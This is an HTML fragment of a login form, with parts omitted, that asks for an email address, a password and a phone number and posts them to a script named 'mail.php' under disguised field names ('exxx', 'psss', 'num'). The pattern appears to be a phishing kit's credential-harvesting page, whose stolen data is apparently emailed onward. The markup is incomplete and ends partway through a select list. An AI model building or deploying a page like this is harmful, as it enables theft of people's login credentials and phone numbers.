...
<form id="login" class="span12 autoSize-this login-widget lw-box-sizing login-widget-vertical tooltip-bottom" method="Post" action="mail.php">	
...
<div class="section">
	...
	<div class="ui-field-contain">
		...
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="emailAddress" pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" style="width:234px;height:25px" name="exxx" type="email" value="" size="40" maxlength="120" minlength="7" placeholder="myemail@email.com" autocomplete="off" required></div>
	</div>
		...
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="emailAddress" style="width:234px;height:25px" name="psss" type="password" value="" size="40" maxlength="120" minlength="4" placeholder="Password" autocomplete="off" required></div>
	</div>
		...
		<div class="ui-field-contain inline-field-contain">
			...
			<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="primaryPhone" style="width:154px;height:25px" name="num" type="tel" value="" size="13" maxlength="12"  placeholder="(___)___-____" required></div>
			...
			<select id="primaryPhoneType" name="phonetype" class="required" ">
					<option value="">
						Select one
					</option>
